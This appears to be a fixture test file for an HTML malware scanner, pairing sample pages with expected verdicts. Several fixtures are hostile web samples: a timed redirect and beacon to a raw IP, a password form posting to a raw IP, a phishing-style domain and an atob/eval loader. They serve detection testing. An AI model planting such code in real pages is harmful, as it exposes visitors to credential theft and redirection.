// shield/tests.js — fixture tests for scan-html.js. Runs anywhere:
// node: `node -e "const t=require('./tests.js'); t.runAll(require('./scan-html.js').scanHtml)"`
// worker: load both sources, call runAll(scanHtml).
const FIXTURES = [
  { name: "clean-page", html: '<html><head><title>Hi</title></head><body><p>Hello</p><a href="https://x.com">x</a></body></html>', want: "CLEAN" },
  { name: "trap-page", html: '<html><head><title>Continue</title></head><body>Redirecting in <span>6</span><script>const u="http://9.9.9.9/go?id=abcdef0123456789";function go(){window.location.href=u;}setTimeout(go,6000);var i=new Image();i.src="http://9.9.9.9/p.png";</script></body></html>', want: "MALICIOUS" },
  { name: "gallery-shell", html: '<html><head><title>Studio</title><script type="application/ld+json">{"@type":"ImageGallery"}</script><meta property="og:url" content="https://confirm-transactions.forum/"></head><body><p>small photography studio publishing limited-edition prints</p></body></html>', want: "SUSPICIOUS" },
  { name: "login-harvest", html: '<html><body><form action="http://1.2.3.4/in"><input type="password" name="p"></form></body></html>', want: "MALICIOUS" },
  { name: "meta-refresh", html: '<html><head><meta http-equiv="refresh" content="0;url=https://ok.example.com/"></head><body></body></html>', want: "LOOK" },
  { name: "obfuscated", html: '<html><body><script>var x=atob("aGVsbG8=");eval(x);</script></body></html>', want: "LOOK" },
];
function runAll(scanHtml) {
  return FIXTURES.map((f) => {
    const got = scanHtml(f.html).verdict;
    return { name: f.name, want: f.want, got, pass: got === f.want };
  });
}
module.exports = { FIXTURES, runAll };
